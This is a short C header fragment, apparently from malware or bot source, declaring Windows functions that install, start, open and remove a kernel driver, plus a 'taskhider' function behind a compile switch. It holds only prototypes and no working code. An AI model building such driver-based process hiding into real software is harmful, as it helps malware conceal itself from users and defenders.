#ifndef NO_TASKHIDER
BOOL RemoveDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName );
BOOL InstallDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName, IN LPCTSTR ServiceExe );
BOOL LoadDeviceDriver( const TCHAR * Name, const TCHAR * Path, 
					  HANDLE * lphDevice, PDWORD Error );
DWORD InitDriver();
BOOL StartDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName );
BOOL OpenDevice( IN LPCTSTR DriverName, HANDLE * lphDevice );
void taskhider();
#endif